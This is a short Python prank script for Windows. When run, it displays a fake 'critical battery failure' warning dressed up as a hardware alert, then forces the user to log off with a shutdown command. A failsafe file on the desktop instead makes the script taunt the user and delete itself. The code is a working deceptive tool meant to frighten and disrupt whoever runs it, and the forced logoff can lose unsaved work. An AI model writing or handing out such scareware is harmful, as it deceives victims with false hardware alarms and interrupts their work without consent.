import os, ctypes
from sys import argv
from time import sleep

# Global Variables
desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') # Desktop Directory

# For Countdown Purpose
def timer(seconds):
    for i in range(seconds):
        sleep(1)

# Show Final Message
def showMessage(message): 
    ctypes.windll.user32.MessageBoxW(0, message, "Device Hardware Issue", 1)

# Main Drive Function
def main():
    # FailSafe
    if os.path.exists(desktop + "\infinity.stone"):
        os.remove(desktop + "\infinity.stone")
        showMessage("Hahah Noob")
        os.remove(argv[0])
        exit()
    # Doomed
    else:
        # timer(5)
        showMessage("Important! Critical battery failure. Your battery has experienced permanent failure and needs to be replaced")
        os.system('cmd /c "shutdown -L"')

if __name__ == '__main__':
    main()